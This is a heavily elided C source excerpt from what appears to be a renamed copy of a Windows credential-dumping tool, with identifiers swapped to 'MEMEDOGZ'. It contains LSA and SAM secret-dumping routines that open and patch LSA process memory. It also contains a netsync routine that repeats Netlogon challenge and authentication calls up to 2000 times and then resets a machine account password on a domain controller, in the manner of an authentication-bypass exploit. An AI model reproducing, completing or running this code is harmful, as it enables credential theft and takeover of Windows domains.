	...
	if(!secretsOrCache)
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &cacheData.username, NULL))
		{
			...
			else
			{
				...
				if(!cacheData.isNtlm)
				{
					kull_m_string_args_byName(argc, argv, L"password", &szPassword, MEMEDOGZ);
...
NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
{
	...
	{
		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), MEMEDOGZ_NT_BUILD_NUMBER))
		{
...
NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
{
	...
	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
	{
		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MEMEDOGZ_NT_BUILD_NUMBER))
		{
			...
			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
				{
...
NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
{
	...
	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			...
			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MEMEDOGZ);
			...
			//{
				...
				if(status == RPC_S_OK)
				{
					...
					RpcTryExcept
					{
						for(i = 0; i < 2000; i++)
						{
							status = NetrServerReqChallenge(NULL, MEMEDOGZ, &Authenticator.Credential, &ReturnAuthenticator.Credential); // I_NetServerReqChallenge
							if(status == STATUS_SUCCESS)
							{
								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, MEMEDOGZ, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags); // I_NetServerAuthenticate2
								if(status == STATUS_SUCCESS)
								{
									bIsAuth = TRUE;
									...
									{
										kprintf(L"\n");
										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, MEMEDOGZ, &Authenticator, &ReturnAuthenticator, &ClearNewPassword); // I_NetServerPasswordSet2
										if(status == STATUS_SUCCESS)
										{
											bIsChanged = TRUE;
